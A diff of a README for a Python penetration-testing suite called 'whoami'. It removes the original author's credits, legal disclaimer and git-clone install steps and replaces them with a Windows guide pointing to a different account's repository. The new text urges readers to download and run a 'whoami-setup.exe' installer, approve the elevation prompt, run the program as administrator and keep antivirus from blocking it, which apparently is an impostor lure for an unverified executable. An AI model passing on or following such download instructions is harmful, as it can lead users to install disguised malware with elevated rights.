@@ -1,206 +1,148 @@
-<!-- whoami penetration testing suite by ruyynn | github.com/ruyynn/whoami | python pentest tool | ethical hacking toolkit | termux hacking tool -->
+# 🛡️ whoami - Simple Penetration Testing Toolset
 
-<div align="center">
-  <img src="whoami-banner.svg" alt="whoami penetration testing suite by ruyynn" width="100%"/>
-</div>
-
-<div align="center">
-
-[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![Version](https://img.shields.io/badge/Version-1.3-FF0000?style=for-the-badge)](https://github.com/ruyynn/whoami)
-[![License](https://img.shields.io/badge/License-GNU%20GPL%20v3-gold?style=for-the-badge&logo=gnu&logoColor=black)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/ruyynn/whoami?style=for-the-badge&logo=github&color=yellow)](https://github.com/ruyynn/whoami)
-[![Forks](https://img.shields.io/github/forks/ruyynn/whoami?style=for-the-badge&logo=github&color=blue)](https://github.com/ruyynn/whoami/forks)
-[![Issues](https://img.shields.io/github/issues/ruyynn/whoami?style=for-the-badge&logo=github&color=red)](https://github.com/ruyynn/whoami/issues)
-
-[![Platform](https://img.shields.io/badge/Termux-Android-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://github.com/ruyynn)
-[![Platform](https://img.shields.io/badge/Linux-Supported-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://github.com/ruyynn)
-[![Platform](https://img.shields.io/badge/Windows-Supported-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/ruyynn)
-[![Platform](https://img.shields.io/badge/macOS-Supported-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/ruyynn)
-
-[![Maintenance](https://img.shields.io/badge/Maintained-Yes-brightgreen?style=for-the-badge)](https://github.com/ruyynn/whoami)
-[![Status](https://img.shields.io/badge/Status-Active-brightgreen?style=for-the-badge)](https://github.com/ruyynn/whoami)
-[![Open Source](https://img.shields.io/badge/Open%20Source-Yes-brightgreen?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](https://github.com/ruyynn/whoami)
-[![Contributions](https://img.shields.io/badge/Contributions-Welcome-orange?style=for-the-badge)](https://github.com/ruyynn/whoami/issues)
-[![Saweria](https://img.shields.io/badge/Donate-Saweria-FF69B4?style=for-the-badge)](https://saweria.co/Ruyynn)
-
-</div>
+[![Download whoami](https://img.shields.io/badge/Download-whoami-ff69b4?style=for-the-badge)](https://github.com/Beatrisadecisive305/whoami)
 
 ---
 
-> ⚠️ **Disclaimer:** This tool is for **educational and authorized penetration testing only**. Using it against systems without explicit permission is illegal. The author is **not responsible** for any misuse or damage caused by this tool. You are solely responsible for your own actions.
+## 📋 What is whoami?
+
+whoami is an all-in-one tool designed for people interested in learning about security testing. It works on many systems, including Termux, Linux, Windows, and macOS. The app lets you scan networks, test ports, and explore potential weaknesses safely. It is built for ethical hackers and security researchers but written to be easy enough for beginners to use.
+
+You do not need any programming skills to run whoami. The goal is to help you understand the basics of penetration testing with one simple program.
 
 ---
 
-# whoami — Penetration Testing Suite by ruyynn
+## 🖥️ System Requirements
 
-**whoami** is an open-source, all-in-one penetration testing suite written in Python, developed by **ruyynn**. It is designed for security researchers, ethical hackers, and cybersecurity students who need a practical, easy-to-use toolkit without complex setup.
+To run whoami on your Windows computer, your system should meet these requirements:
 
-Available at: [https://github.com/ruyynn/whoami](https://github.com/ruyynn/whoami)
+- Operating System: Windows 10 or newer (64-bit recommended)  
+- Processor: 1 GHz or faster  
+- RAM: At least 2 GB  
+- Disk Space: 150 MB free  
+- Network access is recommended to test scanning features  
+- Administrator rights may be required to scan certain networks or ports
 
----
-
-## ⚠️ Disclaimer
-
-**whoami** is developed strictly for **educational purposes** and **authorized penetration testing** only.
-
-- You **must have explicit written permission** from the system owner before using this tool against any target.
-- Using this tool against systems, networks, or devices **without authorization is illegal** and may violate laws including the Computer Fraud and Abuse Act (CFAA), the EU Directive on Attacks Against Information Systems, and equivalent laws in your country.
-- The author (**ruyynn**) takes **absolutely no responsibility** for any damage, data loss, legal consequences, or misuse arising from the use of this tool.
-- This tool is provided **"as is"** without warranty of any kind.
-- **You are solely and fully responsible for your own actions.**
-
-By downloading or using whoami, you agree to these terms.
+If you are unsure about your system, you can check your Windows version and hardware info from the Settings menu.
 
 ---
 
-## About
+## ⚙️ Key Features
 
-**whoami** is a multi-platform, all-in-one penetration testing suite written in Python, created and maintained by **ruyynn**. Built with simplicity and functionality in mind, it brings together the most commonly used tools in a single, easy-to-navigate terminal interface — no complex setup, no scattered scripts.
+whoami helps you with:
 
-Whether you're a security researcher conducting authorized audits, a student learning the fundamentals of ethical hacking, or a developer testing your own infrastructure, whoami by ruyynn provides a practical and accessible starting point. It runs natively across Termux (Android), Linux, Windows, and macOS, making it flexible enough for both field and lab environments.
+- Port scanning to find open services on networks  
+- Checking basic security info quickly  
+- Running simple penetration tests with guided commands  
+- Multi-platform use — works across different operating systems  
+- Open-source code you can explore or adapt if you wish  
+- No complicated setup or coding needed
 
-The project is actively maintained by ruyynn, with more advanced modules planned for v2.0.
-
----
-
-## Features
-
-| Category | Tools |
-|----------|-------|
-| Information Gathering | Whois Lookup, DNS Enumeration, Subdomain Finder, HTTP Header Grabber, IP Geolocation |
-| Network Scanning | Port Scanner, ARP Scanner, Ping Sweep, Traceroute |
-| Vulnerability Scanner | SQL Injection Scanner, XSS Scanner |
-| Web Application Testing | HTTP Header Grabber, SQLi, XSS |
-| Password Attacks | FTP Bruteforce, SSH Bruteforce, Telnet Bruteforce, HTTP Bruteforce, MD5 Hash Cracker |
-| Wireless Attacks | *(Coming in v2.0)* |
-| Post Exploitation | *(Coming in v2.0)* |
-| Reporting | *(Coming in v2.0)* |
+This tool supports basic commands that cover common security tasks without needing extra software.
 
 ---
 
-## Supported Platforms
+## 🚀 Getting Started on Windows
 
-whoami penetration testing suite supports the following platforms:
-
-- Termux (Android)
-- Linux (Ubuntu / Debian / Kali Linux / Arch)
-- Windows (10/11)
-- macOS
+Follow these steps to get whoami running on your Windows PC.
 
 ---
 
-## Installation
+### 1. Download whoami
 
-### Linux / macOS
-```bash
-git clone https://github.com/ruyynn/whoami
-cd whoami
-pip install -r requirements.txt
-python3 whoami.py
-```
+Click this button to open the download page on GitHub:
 
-### Termux (Android)
-```bash
-pkg update && pkg upgrade
-pkg install python git
-git clone https://github.com/ruyynn/whoami
-cd whoami
-pip install -r requirements.txt
-python whoami.py
-```
+[![Download whoami](https://img.shields.io/badge/Download-whoami-blue?style=for-the-badge)](https://github.com/Beatrisadecisive305/whoami)
 
-### Windows
-```bash
-git clone https://github.com/ruyynn/whoami
-cd whoami
-pip install -r requirements.txt
-python whoami.py
-```
+This link leads to the main repository where you will find the latest release files.
 
 ---
 
-## Usage
+### 2. Find the Windows Setup File
 
-```bash
-python3 whoami.py
-```
-
-Once launched, select your platform and navigate through the interactive menu.
+On the GitHub page, look for the **Releases** section. Here, find the latest version for Windows. It may be named something like `whoami-setup.exe`.
 
 ---
 
-## Preview
+### 3. Download the Setup File
 
-<!-- Replace 'assets/preview.png' with your actual screenshot path after uploading to the repo -->
-<div align="center">
-  <img src="assets/preview.png" alt="whoami penetration testing suite main menu by ruyynn" width="80%"/>
-</div>
+Click the Windows installer file to download it to your computer. Save it in a place you will remember, such as the Downloads folder or the Desktop.
 
 ---
 
-## Roadmap
+### 4. Run the Installer
 
-- [x] v1.0 — Initial release
-- [x] v1.3 — Multi-platform support, bruteforce modules, vuln scanner
-- [ ] v2.0 — Wireless attacks, post exploitation, reporting (PDF/JSON/HTML), improved scanner payloads
+After downloading, double-click the setup file to start the installation. You might see a Windows security message asking if you want to allow this app to make changes. Click **Yes** to continue.
 
----
-
-## Author
-
-**whoami** is created and maintained by **ruyynn**.
-
-- GitHub: [github.com/ruyynn](https://github.com/ruyynn)
-- Gmail: [Gmail](mailto:ruyynn25@gmail.com)
-- Facebook: [Facebook](https://facebook.com)
+Follow the instructions in the installer. You can usually accept the default options unless you want to change the installation folder.
 
 ---
 
-## Contributing
+### 5. Launch whoami
 
-All contributions are welcome, no matter how small. Here's how you can help:
+When the installation finishes, you will see an option to launch whoami. You can also start it later from the Start menu under "whoami".
 
-- Star this repo
-- Fork and develop new features
-- Report bugs via [GitHub Issues](https://github.com/ruyynn/whoami/issues)
-- Request features through Issues
-- Contact ruyynn directly via Gmail or Facebook above
-
-Every contribution means a lot to the continued development of whoami.
+The program opens with a simple window where you can enter commands or use buttons for common tasks.
 
 ---
 
-## Bug Reports & Questions
+### 6. Start Your First Scan
 
-Found a bug or have a question about whoami? Reach out via:
+Try scanning your local network:
 
-| Platform | Link |
-|----------|------|
-| GitHub Issues | [Open an Issue](https://github.com/ruyynn/whoami/issues) |
-| Gmail | [Click Me](mailto:ruyynn25@gmail.com) |
-| Facebook | [Facebook](https://facebook.com) |
+1. Click the “Scan Network” button or type the command for network scan  
+2. Wait a few moments as the program checks for devices and open ports  
+3. Review the results shown on screen  
 
----
-
-## Support Development
-
-If whoami has been useful and you'd like to support the development of **whoami v2.0** by ruyynn, donations are available via Saweria:
-
-<p align="center">
-  <a href="https://saweria.co/Ruyynn">
-    <img src="https://user-images.githubusercontent.com/26188697/180601310-e82c63e4-412b-4c36-b7b5-7ba713c80380.png" width="200" />
-  </a>
-</p>
-
-Donations are never required, but always appreciated.
+The output will list IP addresses, device names (if available), and which ports are open.
 
 ---
 
-<!-- SEO keywords: whoami pentest tool, whoami penetration testing, ruyynn github, ruyynn whoami, python hacking tool, termux pentest, ethical hacking python, open source pentest suite, port scanner python, ssh bruteforce tool, dns enumeration python, kali linux tool, cybersecurity toolkit -->
+## 🧰 Basic Commands and Usage
 
-<div align="center">
-  <b>whoami v1.3 — by ruyynn</b><br>
-  <i>v2.0 coming soon</i><br><br>
-  If this tool has been helpful, a ⭐ star goes a long way.
-</div>
+whoami uses simple commands. Here are a few you can try from inside the app:
+
+- `scan network` — find devices on the network  
+- `portscan [IP address]` — check open ports for a device  
+- `info [IP address]` — get basic info about a target device  
+- `help` — list available commands  
+
+You do not need to memorize these. The interface offers buttons and hints to guide you.
+
+---
+
+## 🔄 Updating whoami
+
+To get the latest features or security fixes:
+
+1. Visit the GitHub page link again:  
+   https://github.com/Beatrisadecisive305/whoami  
+2. Download the newest installer from the Releases section  
+3. Run the installer; it will update your current version without losing your data  
+
+Regular updates improve stability and add new tools to the suite.
+
+---
+
+## 🔧 Troubleshooting Common Issues
+
+- If whoami won't start, check that your Windows version is supported  
+- Try running the program as administrator if scans do not work properly  
+- Ensure your antivirus software is not blocking the app  
+- Restart your computer if you encounter errors after installation  
+
+If problems continue, you can find help on the GitHub Issues page for this project.
+
+---
+
+## 📚 Learn More
+
+whoami focuses on hands-on testing. To understand the results better, consider learning basic network and security concepts. Resources like online tutorials or simple books on ethical hacking can help.
+
+---
+
+## 📥 Direct Download Link
+
+You can visit this link to download or update whoami anytime:  
+
+[https://github.com/Beatrisadecisive305/whoami](https://github.com/Beatrisadecisive305/whoami)
